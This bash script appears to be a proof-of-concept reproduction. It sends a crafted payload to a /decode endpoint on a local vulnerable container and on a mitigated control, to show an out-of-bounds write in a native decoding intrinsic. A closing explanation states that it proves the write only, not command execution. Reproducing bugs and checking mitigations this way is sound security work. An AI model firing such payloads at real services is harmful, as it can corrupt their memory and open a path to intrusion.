#!/usr/bin/env bash
set -euo pipefail

payload="$(printf 'A%.0s' {1..64})="

wait_for_service() {
  local url="$1"
  for _ in {1..30}; do
    if curl --silent --fail "$url/health" >/dev/null; then
      return 0
    fi
    sleep 1
  done
  echo "service did not become ready: $url" >&2
  return 1
}

wait_for_service "http://127.0.0.1:8080"
wait_for_service "http://127.0.0.1:8081"

echo "[vulnerable container]"
curl --silent --show-error \
  --request POST \
  --header 'Content-Type: text/plain' \
  --data-binary "$payload" \
  http://127.0.0.1:8080/decode

echo "[mitigated control]"
curl --silent --show-error \
  --request POST \
  --header 'Content-Type: text/plain' \
  --data-binary "$payload" \
  http://127.0.0.1:8081/decode

cat <<'EOF'

[how to read this]
- vulnerable changed_past_expected=62 and mitigated changed_past_expected=0:
  the affected intrinsic was reproduced and the mitigation blocked it.
- both sides report decoder_rejected=true because Java rejects the malformed
  tail after the native intrinsic has already run.
- claim=oob_write_only_not_shell is intentional. This demo proves the write,
  not application-specific command execution.
EOF
